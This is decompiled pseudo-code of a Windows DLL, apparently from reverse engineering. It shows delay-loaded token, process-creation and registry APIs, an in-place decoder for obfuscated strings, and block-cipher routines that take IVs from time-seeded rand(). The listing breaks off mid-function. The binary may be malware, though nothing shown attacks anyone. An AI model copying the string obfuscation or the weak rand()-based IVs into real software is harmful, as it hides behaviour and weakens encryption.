int __fastcall CreateProcessAsUserA_thunk(int a1, int a2)
{
  FARPROC v2; // eax

  v2 = sub_100083EA(&ADVAPI32_dll_import_table, (int *)&CreateProcessAsUserA);
  return ((int (__fastcall *)(int, int))v2)(a1, a2);
}
// 10011648: using guessed type int ADVAPI32_dll_import_table;

//----- (10007AD0) --------------------------------------------------------
void OpenProcessToken_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 10007AD7: control flows out of bounds to 10007ABC

//----- (10007AE2) --------------------------------------------------------
void RegCloseKey_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 10007AE9: control flows out of bounds to 10007ABC

//----- (10007AF4) --------------------------------------------------------
void RegOpenKeyExA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 10007AFB: control flows out of bounds to 10007ABC

//----- (10007B06) --------------------------------------------------------
int __fastcall OLEAUT32_6_thunk(int a1, int a2)
{
  FARPROC v2; // eax

  v2 = sub_100083EA(&OLEAUT32_dll_import_table, (int *)&SysFreeString);
  return ((int (__fastcall *)(int, int))v2)(a1, a2);
}
// 10011668: using guessed type int OLEAUT32_dll_import_table;

//----- (10007B26) --------------------------------------------------------
void __stdcall __noreturn sub_10007B26(int a1)
{
  sub_10008325(a1, 0);
}

//----- (10007B95) --------------------------------------------------------
int __cdecl sub_10007B95(int a1, int a2, int a3, VARTYPE vt, ICreateErrorInfo *perrinfo, LPCWSTR lpString, int a7)
{
  int v7; // esi

  v7 = sub_10007BD1(a1, a2, a3, vt, perrinfo, lpString, (int)&a7, (void **)&perrinfo);
  if ( v7 < 0 )
    SetErrorInfo(0, (IErrorInfo *)perrinfo);
  return v7;
}

//----- (10007BD1) --------------------------------------------------------
int __cdecl sub_10007BD1(
        int a1,
        int a2,
        int a3,
        VARTYPE vt,
        ICreateErrorInfo *pperrinfo,
        LPCWSTR lpString,
        int a7,
        void **a8)
{
  LPCWSTR v9; // ebx
  int v10; // eax
  unsigned int v11; // esi
  int v12; // eax
  void *v13; // esp
  _BYTE *v14; // edx
  bool v15; // zf
  unsigned __int16 *v16; // esi
  _DWORD *v17; // ecx
  int v18; // eax
  int v19; // edx
  unsigned __int16 v20; // di
  int v21; // esi
  int v22; // esi
  int v23; // esi
  _DWORD *v24; // esi
  __int16 v25; // si
  _DWORD *v26; // esi
  unsigned __int16 *v27; // edi
  _DWORD *v28; // esi
  unsigned __int16 *v29; // edi
  int v30; // esi
  _BYTE *v31; // eax
  int v32; // edx
  _WORD *v33; // ecx
  _BYTE *v34; // esi
  unsigned int v35; // ecx
  _DWORD *v36; // ebx
  _DWORD *v37; // eax
  _DWORD *v38; // esi
  HRESULT v39; // ebx
  void **v40; // esi
  ICreateErrorInfo *v41; // edi
  _BYTE v42[12]; // [esp+0h] [ebp-60h] BYREF
  int v43[8]; // [esp+Ch] [ebp-54h] BYREF
  _BYTE *v44; // [esp+2Ch] [ebp-34h] BYREF
  int *v45; // [esp+30h] [ebp-30h]
  int v46; // [esp+34h] [ebp-2Ch]
  unsigned int v47; // [esp+38h] [ebp-28h]
  VARIANTARG pvarg; // [esp+3Ch] [ebp-24h] BYREF
  int v49; // [esp+4Ch] [ebp-14h] BYREF
  int v50; // [esp+50h] [ebp-10h] BYREF
  _BYTE *v51; // [esp+54h] [ebp-Ch]
  _WORD *v52; // [esp+58h] [ebp-8h]
  unsigned __int16 *v53; // [esp+5Ch] [ebp-4h]

  *a8 = 0;
  if ( !a1 )
    return -2147467261;
  v44 = 0;
  v9 = lpString;
  v45 = 0;
  v46 = 0;
  v47 = 0;
  if ( lpString )
  {
    v10 = lstrlenW(lpString);
    v46 = v10;
  }
  else
  {
    v10 = v46;
  }
  v50 = -3;
  if ( (a3 & 0xC) != 0 )
  {
    if ( !v10 )
      return -2147024809;
    v47 = 1;
    v45 = &v50;
  }
  if ( v10 )
  {
    v11 = 16 * v10;
    v12 = 16 * v10 + 3;
    LOBYTE(v12) = v12 & 0xFC;
    v13 = alloca(v12);
    v14 = v42;
    memset(v42, 0, v11);
    v51 = v42;
    v52 = v9;
    v44 = v42;
    v15 = *v9 == 0;
    v16 = (unsigned __int16 *)&v42[16 * v46 - 16];
    v53 = v16;
    if ( !v15 )
    {
      v17 = v16 + 4;
      v18 = a7 - 4;
      v19 = a7 - 8;
      while ( 1 )
      {
        v20 = *v52 & 0xF7FF;
        *v16 = v20;
        if ( v20 > 0x4002u )
        {
          switch ( v20 )
          {
            case 0x4003u:
            case 0x4004u:
            case 0x4005u:
            case 0x4006u:
            case 0x4007u:
            case 0x4008u:
            case 0x4009u:
            case 0x400Au:
            case 0x400Bu:
            case 0x400Cu:
            case 0x400Du:
            case 0x400Eu:
            case 0x4011u:
              goto LABEL_28;
            default:
LABEL_27:
              if ( (v20 & 0x2000) != 0 )
                goto LABEL_28;
              return -2147024809;
          }
        }
        if ( v20 == 16386 )
        {
LABEL_28:
          v30 = *(_DWORD *)(v18 + 4);
          v19 += 4;
          v18 += 4;
          *v17 = v30;
        }
        else
        {
          switch ( v20 )
          {
            case 2u:
              LOWORD(v21) = *(_WORD *)(v18 + 4);
              v19 += 4;
              v18 += 4;
              goto LABEL_17;
            case 3u:
            case 8u:
            case 9u:
            case 0xAu:
            case 0xDu:
              goto LABEL_28;
            case 4u:
              *v53 = 5;
              goto LABEL_19;
            case 5u:
            case 7u:
LABEL_19:
              v22 = *(_DWORD *)(v19 + 8);
              v19 += 8;
              *v17 = v22;
              v18 += 8;
              v23 = *(_DWORD *)(v19 + 4);
              goto LABEL_21;
            case 6u:
              v24 = *(_DWORD **)(v18 + 4);
              v19 += 4;
              v18 += 4;
              *v17 = *v24;
              v23 = v24[1];
LABEL_21:
              v17[1] = v23;
              break;
            case 0xBu:
              v25 = *(_WORD *)(v18 + 4);
              v18 += 4;
              v19 += 4;
              v21 = -(v25 != 0);
LABEL_17:
              *(_WORD *)v17 = v21;
              break;
            case 0xCu:
              v26 = *(_DWORD **)(v18 + 4);
              v27 = v53;
              v19 += 4;
              v18 += 4;
              *(_DWORD *)v53 = *v26++;
              v27 += 2;
              *(_DWORD *)v27 = *v26++;
              v27 += 2;
              *(_DWORD *)v27 = *v26;
              *((_DWORD *)v27 + 1) = v26[1];
              break;
            case 0xEu:
              v28 = *(_DWORD **)(v18 + 4);
              v29 = v53;
              v19 += 4;
              v18 += 4;
              *(_DWORD *)v53 = *v28++;
              v29 += 2;
              *(_DWORD *)v29 = *v28++;
              v29 += 2;
              *(_DWORD *)v29 = *v28;
              *((_DWORD *)v29 + 1) = v28[1];
              *v53 = 14;
              break;
            case 0x11u:
              v19 += 4;
              v18 += 4;
              *(_BYTE *)v17 = *(_BYTE *)v18;
              break;
            default:
              goto LABEL_27;
          }
        }
        ++v52;
        v53 -= 8;
        v17 -= 4;
        if ( !*v52 )
          break;
        v16 = v53;
      }
      v9 = lpString;
      v14 = v51;
    }
    v31 = &v14[16 * v47];
    v32 = 0;
    v33 = &v9[v46 - v47 - 1];
    if ( v33 >= v9 )
    {
      do
      {
        if ( (*v33 & 0xBFFF) != 2060 )
          break;
        v34 = (*v33 & 0x4000) != 0 ? (_BYTE *)*((_DWORD *)v31 + 2) : v31;
        if ( *(_WORD *)v34 != 10 )
          break;
        if ( *((_DWORD *)v34 + 2) != -2147352572 )
          break;
        ++v32;
        v31 += 16;
        --v33;
      }
      while ( v33 >= v9 );
      if ( v32 )
      {
        v35 = 0;
        if ( v47 )
        {
          v36 = v51;
          v37 = &v51[16 * v32];
          do
          {
            *v37 = *v36;
            v37[1] = v36[1];
            v37[2] = v36[2];
            v38 = v36 + 3;
            ++v35;
            v36 += 4;
            v37[3] = *v38;
            v37 += 4;
          }
          while ( v35 < v47 );
        }
        v46 -= v32;
        v44 += 16 * v32;
      }
    }
  }
  VariantInit(&pvarg);
  v49 = -1;
  memset(v43, 0, sizeof(v43));
  v39 = (*(int (__stdcall **)(int, int, void *, _DWORD, int, _BYTE **, VARIANTARG *, int *, int *))(*(_DWORD *)a1 + 24))(
          a1,
          a2,
          &unk_100160A0,
          0,
          a3,
          &v44,
          vt != 0 ? &pvarg : 0,
          v43,
          &v49);
  if ( v39 >= 0 )
  {
    if ( vt )
    {
      if ( vt == 12 || vt == pvarg.vt || (v39 = VariantChangeType(&pvarg, &pvarg, 0, vt), v39 >= 0) )
      {
        switch ( vt )
        {
          case 2u:
          case 0xBu:
            LOWORD(pperrinfo->lpVtbl) = pvarg.iVal;
            return v39;
          case 3u:
          case 4u:
          case 8u:
          case 9u:
          case 0xAu:
          case 0xDu:
            goto LABEL_67;
          case 5u:
          case 6u:
          case 7u:
            *(_QWORD *)&pperrinfo->lpVtbl = pvarg.llVal;
            return v39;
          case 0xCu:
          case 0xEu:
            v41 = pperrinfo;
            pperrinfo->lpVtbl = *(struct ICreateErrorInfoVtbl **)&pvarg.vt;
            ++v41;
            v41->lpVtbl = (struct ICreateErrorInfoVtbl *)pvarg.decVal.Hi32;
            *(_QWORD *)&v41[1].lpVtbl = pvarg.llVal;
            return v39;
          case 0x11u:
            LOBYTE(pperrinfo->lpVtbl) = pvarg.bVal;
            return v39;
          default:
            if ( (vt & 0x6000) == 0x2000 )
            {
LABEL_67:
              pperrinfo->lpVtbl = (struct ICreateErrorInfoVtbl *)pvarg.decVal.Lo32;
              return v39;
            }
            v39 = -2147024809;
            break;
        }
      }
      VariantClear(&pvarg);
    }
    return v39;
  }
  VariantClear(&pvarg);
  if ( v39 != -2147352567 )
    return v39;
  if ( v43[6] )
    ((void (__stdcall *)(int *))v43[6])(v43);
  pperrinfo = 0;
  if ( CreateErrorInfo(&pperrinfo) >= 0 )
  {
    pperrinfo->lpVtbl->SetGUID(pperrinfo, (const GUID *const)&unk_10014CD8);
    pperrinfo->lpVtbl->SetDescription(pperrinfo, (LPOLESTR)v43[2]);
    pperrinfo->lpVtbl->SetHelpContext(pperrinfo, v43[4]);
    pperrinfo->lpVtbl->SetHelpFile(pperrinfo, (LPOLESTR)v43[3]);
    pperrinfo->lpVtbl->SetSource(pperrinfo, (LPOLESTR)v43[1]);
    v40 = a8;
    if ( pperrinfo->lpVtbl->QueryInterface(pperrinfo, &stru_10014CC8, a8) < 0 )
      *v40 = 0;
  }
  if ( !LOWORD(v43[0]) )
    return v43[7];
  if ( LOWORD(v43[0]) < 0xFE00u )
    return LOWORD(v43[0]) - 2147220992;
  return -2147155969;
}
// 10014CC8: using guessed type IID stru_10014CC8;

//----- (1000807A) --------------------------------------------------------
int __cdecl sub_1000807A(int a1, int a2, int a3, VARTYPE vt, ICreateErrorInfo *pperrinfo, LPCWSTR lpString, int a7)
{
  int result; // eax

  result = sub_10007BD1(a1, a2, a3, vt, pperrinfo, lpString, (int)&a7, (void **)&pperrinfo);
  if ( result < 0 )
    sub_10008325(result, (int)pperrinfo);
  return result;
}

//----- (100081A2) --------------------------------------------------------
int sub_100081A2()
{
  sub_100081AC();
  return atexit(sub_100081CA);
}

//----- (100081AC) --------------------------------------------------------
_DWORD *sub_100081AC()
{
  return sub_100082C9(&pvarg, -2147352572, 10);
}

//----- (100081CA) --------------------------------------------------------
void __cdecl sub_100081CA()
{
  int v0; // eax

  v0 = VariantClear(&pvarg);
  if ( v0 < 0 )
    sub_10007B26(v0);
}

//----- (100081E0) --------------------------------------------------------
BSTR __stdcall sub_100081E0(LPCSTR lpString)
{
  int v2; // esi
  int v3; // eax
  void *v4; // esp
  int v5; // eax
  WCHAR v6[4]; // [esp+0h] [ebp-8h] BYREF

  if ( !lpString )
    return 0;
  v2 = lstrlenA(lpString) + 1;
  v3 = 2 * v2 + 3;
  LOBYTE(v3) = v3 & 0xFC;
  v4 = alloca(v3);
  v6[0] = 0;
  if ( !MultiByteToWideChar(0, 0, lpString, -1, v6, v2) )
  {
    if ( GetLastError() )
      v5 = (unsigned __int16)GetLastError() | 0x80070000;
    else
      v5 = 0;
    sub_10007B26(v5);
  }
  return SysAllocString(v6);
}

//----- (100082C9) --------------------------------------------------------
_DWORD *__thiscall sub_100082C9(_DWORD *this, int a2, __int16 a3)
{
  if ( a3 != 3 )
  {
    if ( a3 == 10 )
    {
      *(_WORD *)this = 10;
LABEL_10:
      this[2] = a2;
      return this;
    }
    if ( a3 != 11 )
      sub_10007B26(-2147024809);
  }
  if ( a3 != 11 )
  {
    *(_WORD *)this = 3;
    goto LABEL_10;
  }
  *(_WORD *)this = 11;
  *((_WORD *)this + 4) = -(a2 != 0);
  return this;
}
// 100082F2: conditional instruction was optimized away because %arg_4.2 is in (==3|==B)

//----- (10008325) --------------------------------------------------------
void __cdecl __noreturn sub_10008325(int a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_10008349(pExceptionObject, a1, a2, 0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AV_com_error__);
}
// 10008325: using guessed type _DWORD pExceptionObject[4];

//----- (10008349) --------------------------------------------------------
_DWORD *__thiscall sub_10008349(_DWORD *this, int a2, int a3, char a4)
{
  this[3] = 0;
  this[1] = a2;
  *this = &_com_error::`vftable';
  this[2] = a3;
  if ( a3 && a4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 4))(a3);
  return this;
}
// 10010664: using guessed type void *_com_error::`vftable';

//----- (1000837B) --------------------------------------------------------
_DWORD *__thiscall sub_1000837B(_DWORD *this, char a2)
{
  sub_100083C4(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (10008397) --------------------------------------------------------
_DWORD *__thiscall sub_10008397(_DWORD *this, int a2)
{
  int v3; // eax

  this[1] = *(_DWORD *)(a2 + 4);
  v3 = *(_DWORD *)(a2 + 8);
  this[3] = 0;
  this[2] = v3;
  *this = &_com_error::`vftable';
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  return this;
}
// 10010664: using guessed type void *_com_error::`vftable';

//----- (100083C4) --------------------------------------------------------
HLOCAL __thiscall sub_100083C4(_DWORD *this)
{
  HLOCAL result; // eax
  void *v3; // esi

  result = (HLOCAL)this[2];
  *this = &_com_error::`vftable';
  if ( result )
    result = (HLOCAL)(*(int (__stdcall **)(HLOCAL))(*(_DWORD *)result + 8))(result);
  v3 = (void *)this[3];
  if ( v3 )
    return LocalFree(v3);
  return result;
}
// 10010664: using guessed type void *_com_error::`vftable';

//----- (100083EA) --------------------------------------------------------
FARPROC __stdcall sub_100083EA(int *a1, int *Arguments)
{
  ULONG_PTR v2; // esi
  FARPROC ProcAddress; // ebx
  HMODULE *v4; // eax
  HMODULE LibraryA; // edi
  int *v6; // eax
  bool v7; // zf
  int v8; // eax
  _DWORD *v10; // eax
  int v11; // ecx
  _DWORD *v12; // eax
  int v13[3]; // [esp+Ch] [ebp-24h] BYREF
  LPCSTR lpLibFileName; // [esp+18h] [ebp-18h]
  BOOL v15; // [esp+1Ch] [ebp-14h]
  LPCSTR lpProcName; // [esp+20h] [ebp-10h]
  HMODULE v17; // [esp+24h] [ebp-Ch]
  int (__stdcall *v18)(); // [esp+28h] [ebp-8h]
  DWORD LastError; // [esp+2Ch] [ebp-4h]

  v2 = (ULONG_PTR)a1;
  ProcAddress = 0;
  lpLibFileName = (LPCSTR)a1[1];
  v13[0] = 36;
  v13[1] = (int)a1;
  v13[2] = (int)Arguments;
  v15 = 0;
  lpProcName = 0;
  v4 = (HMODULE *)a1[2];
  v17 = 0;
  v18 = 0;
  LastError = 0;
  LibraryA = *v4;
  v6 = (int *)(4 * (((int)Arguments - a1[3]) >> 2) + a1[4]);
  a1 = (int *)(4 * (((int)Arguments - a1[3]) >> 2));
  v7 = *v6 < 0;
  v15 = *v6 >= 0;
  v8 = *v6;
  if ( v7 )
    v8 = (unsigned __int16)v8;
  else
    v8 += 2;
  lpProcName = (LPCSTR)v8;
  if ( !dword_100160C8 || (ProcAddress = (FARPROC)dword_100160C8(0, v13)) == 0 )
  {
    if ( !LibraryA )
    {
      if ( !dword_100160C8 || (LibraryA = (HMODULE)dword_100160C8(1, v13)) == 0 )
      {
        LibraryA = LoadLibraryA(lpLibFileName);
        if ( !LibraryA )
        {
          LastError = GetLastError();
          if ( !dword_100160C4 || (LibraryA = (HMODULE)dword_100160C4(3, v13)) == 0 )
          {
            Arguments = v13;
            RaiseException(0xC06D007E, 0, 1u, (const ULONG_PTR *)&Arguments);
            return v18;
          }
        }
      }
      if ( (HMODULE)InterlockedExchange(*(volatile LONG **)(v2 + 8), (LONG)LibraryA) == LibraryA )
      {
        FreeLibrary(LibraryA);
      }
      else if ( *(_DWORD *)(v2 + 24) )
      {
        v10 = LocalAlloc(0x40u, 8u);
        if ( v10 )
        {
          v10[1] = v2;
          *v10 = dword_100160C0;
          dword_100160C0 = (int)v10;
        }
      }
    }
    v17 = LibraryA;
    if ( dword_100160C8 )
      ProcAddress = (FARPROC)dword_100160C8(2, v13);
    if ( !ProcAddress )
    {
      if ( *(_DWORD *)(v2 + 20) )
      {
        v11 = *(_DWORD *)(v2 + 28);
        if ( v11 )
        {
          v12 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15));
          if ( *v12 == 17744 && v12[2] == v11 && LibraryA == (HMODULE)v12[13] )
          {
            sub_10008673(*(_DWORD **)(v2 + 12), *(const void **)(v2 + 20));
            ProcAddress = *(FARPROC *)((char *)a1 + *(_DWORD *)(v2 + 12));
            goto LABEL_33;
          }
        }
      }
      ProcAddress = GetProcAddress(LibraryA, lpProcName);
      if ( !ProcAddress )
      {
        LastError = GetLastError();
        if ( dword_100160C4 )
          ProcAddress = (FARPROC)dword_100160C4(4, v13);
        if ( !ProcAddress )
        {
          a1 = v13;
          RaiseException(0xC06D007F, 0, 1u, (const ULONG_PTR *)&a1);
          ProcAddress = v18;
        }
      }
    }
    *Arguments = (int)ProcAddress;
  }
LABEL_33:
  if ( dword_100160C8 )
  {
    LastError = 0;
    v17 = LibraryA;
    v18 = ProcAddress;
    dword_100160C8(5, v13);
  }
  return ProcAddress;
}
// 100160C0: using guessed type int dword_100160C0;
// 100160C4: using guessed type int (__stdcall *dword_100160C4)(_DWORD, _DWORD);
// 100160C8: using guessed type int (__stdcall *dword_100160C8)(_DWORD, _DWORD);

//----- (10008673) --------------------------------------------------------
_DWORD *__stdcall sub_10008673(_DWORD *a1, const void *a2)
{
  int v2; // ecx
  _DWORD *result; // eax

  v2 = 0;
  for ( result = a1; *result; ++v2 )
    ++result;
  qmemcpy(a1, a2, 4 * v2);
  return result;
}

//----- (10008918) --------------------------------------------------------
int __cdecl sub_10008918(int a1)
{
  int v1; // esi
  int result; // eax
  char v3; // bl
  unsigned int i; // edx

  v1 = a1 + 13;
  if ( *(_BYTE *)(a1 + 12) == 66 )
    return a1 + 13;
  v3 = 0;
  for ( i = 0; i < *(unsigned __int16 *)(a1 + 10); ++i )
  {
    *(_BYTE *)(i + v1) += -62 - v3 * (i + 110) - i;
    v3 = *(_BYTE *)(i + v1);
  }
  result = a1 + 13;
  *(_BYTE *)(a1 + 12) = 66;
  return result;
}

//----- (10008959) --------------------------------------------------------
void sub_10008959()
{
  unsigned int v0; // eax

  v0 = time(0);
  srand(v0);
}

//----- (1000896B) --------------------------------------------------------
BOOL __cdecl sub_1000896B(void *Src, void *a2, _DWORD *a3, int a4, int *a5)
{
  char v6[84]; // [esp+8h] [ebp-114Ch] BYREF
  char v7[32]; // [esp+5Ch] [ebp-10F8h] BYREF
  unsigned __int8 v8[24]; // [esp+112Ch] [ebp-28h] BYREF
  char v9[16]; // [esp+1144h] [ebp-10h] BYREF

  if ( !Src || !a2 || !a3 || !a5 )
    return 1;
  if ( sub_10009DE3((int)v6, 0, 256, 0) != 1 )
    return 1;
  if ( sub_10009E57((int)v8, 2, 0) != 1 )
    return 1;
  memcpy(v7, Src, sizeof(v7));
  if ( sub_10009371((int)v6) != 1 )
    return 1;
  memcpy(v9, a2, sizeof(v9));
  return sub_10009EA5(v8, (int)v6, a3, 8 * a4, a5) != 8 * a4;
}

//----- (10008A3A) --------------------------------------------------------
BOOL __cdecl sub_10008A3A(void *a1, void *Src, size_t Size, void **Block, _DWORD *a5)
{
  BOOL result; // eax
  size_t v7; // eax
  _DWORD *v8; // eax
  void *v9; // eax
  BOOL v10; // eax
  char v11[16]; // [esp+8h] [ebp-18h] BYREF
  BOOL v12; // [esp+18h] [ebp-8h]
  size_t v13; // [esp+1Ch] [ebp-4h] BYREF
  _DWORD *Blocka; // [esp+34h] [ebp+14h]

  memset(v11, 0, sizeof(v11));
  result = 1;
  v13 = 0;
  v12 = 1;
  if ( Block && a5 && !*Block && Src && a1 )
  {
    sub_10008B80((int)v11, 16);
    v7 = 16 - (Size & 0xF);
    v13 = v7;
    if ( v7 == 16 )
    {
      v7 = 0;
      v13 = 0;
    }
    v8 = malloc(Size + v7);
    Blocka = v8;
    if ( !v8 )
      goto LABEL_18;
    memcpy(v8, Src, Size);
    memset((char *)Blocka + Size, 0, v13);
    v9 = malloc(v13 + Size + 20);
    *Block = v9;
    if ( !v9
      || (memcpy(v9, &v13, 4u),
          memcpy((char *)*Block + 4, v11, 0x10u),
          memset((char *)*Block + 20, 0, Size + v13),
          v10 = sub_1000896B(a1, v11, Blocka, Size + v13, (int *)*Block + 5),
          v12 = v10,
          *a5 = v13 + Size + 20,
          v10) )
    {
LABEL_18:
      if ( *Block )
      {
        free(*Block);
        *Block = 0;
      }
    }
    if ( Blocka )
      free(Blocka);
    return v12;
  }
  return result;
}

//----- (10008B80) --------------------------------------------------------
void __cdecl sub_10008B80(int a1, int a2)
{
  int v2; // esi

  v2 = 0;
  if ( a1 && a2 > 0 )
  {
    do
    {
      *(_BYTE *)(v2 + a1) = rand();
      ++v2;
    }
    while ( v2 < a2 );
  }
}

//----- (10008BA5) --------------------------------------------------------
BOOL __cdecl sub_10008BA5(void *Src, void *a2, int *a3, int a4, int *a5)
{
  char v6[84]; // [esp+8h] [ebp-114Ch] BYREF
  char v7[32]; // [esp+5Ch] [ebp-10F8h] BYREF
  unsigned __int8 v8[24]; // [esp+112Ch] [ebp-28h] BYREF
  char v9[16]; // [esp+1144h] [ebp-10h] BYREF

  if ( !Src || !a2 || !a3 || !a5 )
    return 1;
  if ( sub_10009DE3((int)v6, 1, 256, 0) != 1 )
    return 1;
  if ( sub_10009E57((int)v8, 2, 0) != 1 )
    return 1;
  memcpy(v7, Src, sizeof(v7));
  if ( sub_10009371((int)v6) != 1 )
    return 1;
  memcpy(v9, a2, sizeof(v9));
  return sub_1000A856(v8, (int)v6, a3, 8 * a4, a5) != 8 * a4;
}

//----- (10008C74) --------------------------------------------------------
BOOL __cdecl sub_10008C74(void *a1, int *Src, unsigned int a3, void **a4, _DWORD *a5)
{
  BOOL result; // eax
  size_t v6; // esi
  void *v7; // eax
  void *v8; // eax
  bool v9; // zf
  char v10[16]; // [esp+8h] [ebp-1Ch] BYREF
  BOOL v11; // [esp+18h] [ebp-Ch]
  void *Block; // [esp+1Ch] [ebp-8h]
  unsigned int v13; // [esp+20h] [ebp-4h] BYREF

  memset(v10, 0, sizeof(v10));
  result = 1;
  v13 = 0;
  Block = 0;
  v11 = 1;
  if ( a4 && a5 && !*a4 && Src && a1 )
  {
    if ( a3 < 0x14 )
      goto LABEL_19;
    memcpy(&v13, Src, sizeof(v13));
    if ( v13 >= 0x10 )
      goto LABEL_19;
    memcpy(v10, Src + 1, sizeof(v10));
    v6 = a3 - 20;
    if ( (((_BYTE)a3 - 20) & 0xF) != 0 )
      goto LABEL_19;
    v7 = malloc(v6);
    Block = v7;
    if ( !v7 )
      goto LABEL_19;
    memset(v7, 0, v6);
    v8 = malloc(v6 - v13 + 1);
    *a4 = v8;
    if ( !v8
      || (memset(v8, 0, v6 - v13 + 1),
          v11 = sub_10008BA5(a1, v10, Src + 5, v6, (int *)Block),
          memcpy(*a4, Block, v6 - v13),
          v9 = v11,
          *a5 = v6 - v13,
          v9) )
    {
LABEL_19:
      if ( *a4 )
      {
        free(*a4);
        *a4 = 0;
      }
    }
    if ( Block )
      free(Block);
    return v11;
  }
  return result;
}

//----- (10008DAB) --------------------------------------------------------
void __cdecl sub_10008DAB(void *Block)
{
  if ( Block )
    free(Block);
}

//----- (10008DE6) --------------------------------------------------------
int __cdecl sub_10008DE6(int a1, int a2, _DWORD *a3, int a4)
{
  int v4; // edi
  _DWORD *v5; // eax
  int i; // ecx
  char v7; // cl
  int v8; // esi
  int v10; // [esp+Ch] [ebp-4h]

  v4 = 0;
  if ( a1 <= 0 )
    return 0;
  v5 = a3;
  for ( i = 0; i < a1; i += 32 )
    *v5++ = 0;
  v10 = 0;
  while ( 1 )
  {
    v7 = *(_BYTE *)(a2 + v4);
    if ( a4 )
      *(_BYTE *)(v4 + a4) = v7;
    if ( v7 < 48 || v7 > 57 )
      break;
    v8 = v7 - 48;
LABEL_16:
    v10 += 4;
    a3[v4 / 8] |= v8 << (4 * ((v4 ^ 1) & 7));
    ++v4;
    if ( v10 >= a1 )
      return 0;
  }
  if ( v7 >= 97 && v7 <= 102 )
  {
    v8 = v7 - 87;
    goto LABEL_16;
  }
  if ( v7 >= 65 && v7 <= 70 )
  {
    v8 = v7 - 55;
    goto LABEL_16;
  }
  return -2;
}
// 10008E0D: conditional instruction was optimized away because %arg_0.4>=1

//----- (10008E91) --------------------------------------------------------
int __cdecl sub_10008E91(int a1, int a2)
{
  int v2; // edi
  int v3; // eax
  int v4; // eax
  int v5; // esi
  int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i < 2; ++i )
  {
    v3 = a1;
    if ( !i )
      v3 = a2;
    v2 ^= v3;
    v4 = 4;
    do
    {
      v5 = (v2 < 0 ? 0x4D : 0) ^ (2 * (HIBYTE(v2) & 0x7F));
      --v4;
      v2 = HIBYTE(v2) ^ ((v2 ^ v5 ^ (HIBYTE(v2) >> 1) ^ ((v2 & 0x1000000) != 0 ? 0xA6 : 0) ^ ((v5 ^ ((v5 ^ (HIBYTE(v2) >> 1) ^ ((v2 & 0x1000000) != 0 ? 0xA6 : 0)) << 8)) << 8)) << 8);
    }
    while ( v4 );
  }
  return v2;
}

//----- (10008F11) --------------------------------------------------------
int sub_10008F11()
{
  int v0; // edi
  int *v1; // esi
  unsigned __int8 v2; // bl
  char v3; // al
  char v4; // dl
  char v5; // cl
  char v6; // al
  char v7; // al
  int v8; // ebx
  int v9; // ebx
  int v10; // eax
  int result; // eax
  int v12; // [esp+Ch] [ebp-Ch]
  char v13; // [esp+13h] [ebp-5h]
  char v14; // [esp+16h] [ebp-2h]
  unsigned __int8 v15; // [esp+17h] [ebp-1h]

  v0 = 0;
  v1 = &dword_100165E0;
  do
  {
    v2 = byte_10014D28[v0];
    v3 = (v2 & 2) != 0 ? 0xB4 : 0;
    v14 = (v2 & 1) == 0 ? 0 : 0x5A;
    v4 = v2 ^ v3 ^ v14 ^ (v2 >> 2);
    v15 = byte_10014E28[v0];
    v5 = v2 ^ v3 ^ v14 ^ ((v2 & 1) == 0 ? 0 : 0xB4) ^ ((unsigned __int8)(v2 ^ (v2 >> 1)) >> 1);
    v6 = (v15 & 2) != 0 ? 0xB4 : 0;
    v13 = v15 ^ v6 ^ ((v15 & 1) == 0 ? 0 : 0x5A) ^ (v15 >> 2);
    LOBYTE(v12) = v15;
    v7 = v15 ^ v6 ^ ((v15 & 1) == 0 ? 0 : 0x5A) ^ ((v15 & 1) == 0 ? 0 : 0xB4) ^ ((unsigned __int8)(v15 ^ (v15 >> 1)) >> 1);
    BYTE1(v12) = v13;
    BYTE2(v12) = v7;
    HIBYTE(v12) = v7;
    v8 = v12;
    LOBYTE(v12) = v5;
    *(v1 - 256) = v8;
    BYTE1(v12) = v5;
    BYTE2(v12) = v4;
    HIBYTE(v12) = byte_10014D28[v0];
    v9 = v12;
    BYTE1(v12) = v7;
    *v1 = v9;
    LOBYTE(v12) = v13;
    BYTE2(v12) = byte_10014E28[v0];
    HIBYTE(v12) = v7;
    ++v1;
    v10 = v12;
    LOBYTE(v12) = v4;
    v1[255] = v10;
    BYTE1(v12) = byte_10014D28[v0];
    BYTE2(v12) = v5;
    HIBYTE(v12) = v4;
    ++v0;
    result = v12;
    v1[511] = v12;
  }
  while ( (int)v1 < (int)&dword_100169E0 );
  dword_10014F28 = 0;
  return result;
}
// 10014F28: using guessed type int dword_10014F28;
// 100165E0: using guessed type int dword_100165E0;
// 100169E0: using guessed type int dword_100169E0;

//----- (1000905D) --------------------------------------------------------
char __cdecl sub_1000905D(int a1, char a2)
{
  int *v2; // eax
  int *v3; // ecx
  int v4; // edx
  int v5; // esi
  char result; // al

  v2 = (int *)(a1 + 164);
  v3 = (int *)(a1 + 164 + 8 * *(_DWORD *)(a1 + 80) - 8);
  if ( a1 + 164 < (unsigned int)v3 )
  {
    do
    {
      v4 = *v2;
      v5 = v2[1];
      *v2 = *v3;
      v2[1] = v3[1];
      *v3 = v4;
      v3[1] = v5;
      v2 += 2;
      v3 -= 2;
    }
    while ( v2 < v3 );
  }
  result = a2;
  *(_BYTE *)a1 = a2;
  return result;
}

//----- (1000909D) --------------------------------------------------------
int __cdecl sub_1000909D(int *a1, _DWORD *a2, unsigned __int8 a3)
{
  int v3; // edx
  int result; // eax

  v3 = 16843009 * a3;
  *a1 = v3 ^ *a2;
  a1[1] = v3 ^ a2[1];
  a1[2] = v3 ^ a2[2];
  a1[3] = v3 ^ a2[3];
  a1[4] = v3 ^ a2[4];
  a1[5] = v3 ^ a2[5];
  a1[6] = v3 ^ a2[6];
  a1[7] = v3 ^ a2[7];
  a1[8] = v3 ^ a2[8];
  a1[9] = v3 ^ a2[9];
  a1[10] = v3 ^ a2[10];
  a1[11] = v3 ^ a2[11];
  a1[12] = v3 ^ a2[12];
  a1[13] = v3 ^ a2[13];
  a1[14] = v3 ^ a2[14];
